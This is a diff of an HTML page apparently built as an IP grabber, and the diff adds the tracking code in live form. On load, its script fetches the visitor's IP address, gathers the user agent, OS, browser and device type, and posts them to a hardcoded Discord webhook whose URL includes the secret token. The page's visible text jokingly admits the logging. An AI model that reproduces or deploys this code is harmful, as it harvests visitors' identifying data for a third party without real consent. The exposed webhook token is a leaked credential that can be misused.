@@ -27,44 +27,58 @@
             100% { background-color: white; color: black; }
         }
     </style>
+</head>
+<body>
+    <h1>Welcome to our awesome site!</h1>
+    <p>Enjoy the music while we log your IP address.</p>
+    
     <script>
         document.addEventListener("DOMContentLoaded", function() {
+            playMusic();
+            logIpAddress();
+        });
+
+        function playMusic() {
             var audio = new Audio('music.mp3');
             audio.play();
             audio.addEventListener('ended', function() {
                 this.currentTime = 0;
                 this.play();
             }, false);
-        });
-
-        var embedSent = false;
-
-        var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
-
-        function sendToDiscord(ipAddress, locationData) {
-            console.log("IP Address:", ipAddress);
-            console.log("Location Data:", locationData);
-
-            var embedData = {
-                "IP Address": ipAddress,
-                "City": locationData.city,
-                "Region": locationData.region,
-                "Country": locationData.country_name,
-                "Country Code": locationData.country_code,
-                "Continent Code": locationData.continent_code,
-                "Timezone": locationData.timezone,
-                "Currency": locationData.currency,
-                "Language": locationData.languages,
-                "ASN": locationData.asn,
-                "Organization": locationData.org
-            };
-
-            sendEmbed(embedData);
         }
 
-        function sendEmbed(embedData) {
-            if (embedSent) return;
+        function logIpAddress() {
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    var locationData = {}; // Fetch location data using ipAddress if needed
 
+                    sendToDiscord(ipAddress, locationData);
+                })
+                .catch(error => console.error('Error fetching IP address:', error));
+        }
+
+        function sendToDiscord(ipAddress, locationData) {
+            var embedData = {
+                "IP Address": ipAddress,
+                "City": "Unknown",
+                "Region": "Unknown",
+                "Country": "Unknown",
+                "Country Code": "Unknown",
+                "Continent Code": "Unknown",
+                "Timezone": "Unknown",
+                "Currency": "Unknown",
+                "Language": "Unknown",
+                "ASN": "Unknown",
+                "Organization": "Unknown"
+            };
+
+            var embed = createEmbed(embedData);
+            sendEmbed(embed);
+        }
+
+        function createEmbed(embedData) {
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
             var os = detectOS(userAgent);
@@ -78,154 +92,87 @@
                         "description": "A user has visited the page.",
                         "color": 65280,
                         "fields": [
-                            {
-                                "name": "IP Address",
-                                "value": `\`\`\`${embedData["IP Address"]}\`\`\``
-                            },
-                            {
-                                "name": "City",
-                                "value": `\`\`\`${embedData["City"]}\`\`\``
-                            },
-                            {
-                                "name": "Region",
-                                "value": `\`\`\`${embedData["Region"]}\`\`\``
-                            },
-                            {
-                                "name": "Country",
-                                "value": `\`\`\`${embedData["Country"]}\`\`\``
-                            },
-                            {
-                                "name": "Country Code",
-                                "value": `\`\`\`${embedData["Country Code"]}\`\`\``
-                            },
-                            {
-                                "name": "Continent Code",
-                                "value": `\`\`\`${embedData["Continent Code"]}\`\`\``
-                            },
-                            {
-                                "name": "Timezone",
-                                "value": `\`\`\`${embedData["Timezone"]}\`\`\``
-                            },
-                            {
-                                "name": "Currency",
-                                "value": `\`\`\`${embedData["Currency"]}\`\`\``
-                            },
-                            {
-                                "name": "Language",
-                                "value": `\`\`\`${embedData["Language"]}\`\`\``
-                            },
-                            {
-                                "name": "ASN",
-                                "value": `\`\`\`${embedData["ASN"]}\`\`\``
-                            },
-                            {
-                                "name": "Organization",
-                                "value": `\`\`\`${embedData["Organization"]}\`\`\``
-                            },
-                            {
-                                "name": "Operating System",
-                                "value": `\`\`\`${os}\`\`\``
-                            },
-                            {
-                                "name": "Browser",
-                                "value": `\`\`\`${browser}\`\`\``
-                            },
-                            {
-                                "name": "Device Type",
-                                "value": `\`\`\`${deviceType}\`\`\``
-                            },
-                            {
-                                "name": "User Agent",
-                                "value": `\`\`\`${userAgent}\`\`\``
-                            },
-                            {
-                                "name": "Timestamp",
-                                "value": `\`\`\`${timestamp}\`\`\``
-                            }
+                            { "name": "IP Address", "value": "```" + embedData["IP Address"] + "```" },
+                            { "name": "City", "value": "```" + embedData["City"] + "```" },
+                            { "name": "Region", "value": "```" + embedData["Region"] + "```" },
+                            { "name": "Country", "value": "```" + embedData["Country"] + "```" },
+                            { "name": "Country Code", "value": "```" + embedData["Country Code"] + "```" },
+                            { "name": "Continent Code", "value": "```" + embedData["Continent Code"] + "```" },
+                            { "name": "Timezone", "value": "```" + embedData["Timezone"] + "```" },
+                            { "name": "Currency", "value": "```" + embedData["Currency"] + "```" },
+                            { "name": "Language", "value": "```" + embedData["Language"] + "```" },
+                            { "name": "ASN", "value": "```" + embedData["ASN"] + "```" },
+                            { "name": "Organization", "value": "```" + embedData["Organization"] + "```" },
+                            { "name": "Operating System", "value": "```" + os + "```" },
+                            { "name": "Browser", "value": "```" + browser + "```" },
+                            { "name": "Device Type", "value": "```" + deviceType + "```" },
+                            { "name": "User Agent", "value": "```" + userAgent + "```" },
+                            { "name": "Timestamp", "value": "```" + timestamp + "```" }
                         ],
-                        "footer": {
-                            "text": "Info generated by Paxz!!!"
-                        }
+                        "footer": { "text": "Info generated by Paxz!!!" }
                     }
                 ]
             };
 
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", webhookURL);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    if (xhr.status === 200) {
-                        console.log("Embed sent successfully!");
-                        embedSent = true;
-                    } else {
-                        console.error("Failed to send embed:", xhr.status, xhr.statusText);
-                    }
+            return embed;
+        }
+
+        function sendEmbed(embed) {
+            var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send embed:', response.status, response.statusText);
+                } else {
+                    console.log('Embed sent successfully!');
                 }
-            };
-            xhr.send(JSON.stringify(embed));
+            })
+            .catch(error => console.error('Error sending embed:', error));
         }
 
         function detectOS(userAgent) {
-            var OSes = [
-                'Windows',
-                'Mac OS',
-                'Linux',
-                'iOS',
-                'Android'
-            ];
-
-            var detectedOS = OSes.find(function(os) {
-                return userAgent.indexOf(os) >= 0;
-            });
-
-            return detectedOS || 'Unknown';
+            var os;
+            if (userAgent.includes("Windows")) {
+                os = "Windows";
+            } else if (userAgent.includes("Mac")) {
+                os = "Mac OS";
+            } else if (userAgent.includes("Linux")) {
+                os = "Linux";
+            } else {
+                os = "Unknown OS";
+            }
+            return os;
         }
 
         function detectBrowser(userAgent) {
-            var browsers = [
-                'Chrome',
-                'Firefox',
-                'Safari',
-                'Edge',
-                'Opera',
-                'MSIE',
-                'Trident',
-                'Edge',
-                'Netscape',
-                'SeaMonkey',
-                'UCBrowser',
-                'Vivaldi',
-                'Yandex',
-                'Brave',
-                'Avant',
-                'Konqueror',
-                'Lunascape',
-                'Maxthon',
-                'Sleipnir',
-                'SlimBrowser'
-            ];
-
-            var detectedBrowser = browsers.find(function(browser) {
-                return userAgent.indexOf(browser) >= 0;
-            });
-
-            return detectedBrowser || 'Unknown';
+            var browser;
+            if (userAgent.includes("Firefox")) {
+                browser = "Firefox";
+            } else if (userAgent.includes("Chrome")) {
+                browser = "Chrome";
+            } else if (userAgent.includes("Safari")) {
+                browser = "Safari";
+            } else if (userAgent.includes("Edge")) {
+                browser = "Edge";
+            } else {
+                browser = "Unknown Browser";
+            }
+            return browser;
         }
 
         function getDeviceType() {
-            const userAgent = navigator.userAgent;
+            var userAgent = navigator.userAgent;
             if (userAgent.includes("Mobile")) return "Phone";
             if (userAgent.includes("Tablet")) return "Tablet";
             if (userAgent.includes("Console")) return "Console";
             if (userAgent.includes("Windows")) return "PC / Computer";
             return "Unknown Device";
         }
-
     </script>
-</head>
-<body>
-    <h1>Welcome to our awesome site!</h1>
-    <p>Enjoy the music while we log your IP address.</p>
 </body>
 </html>
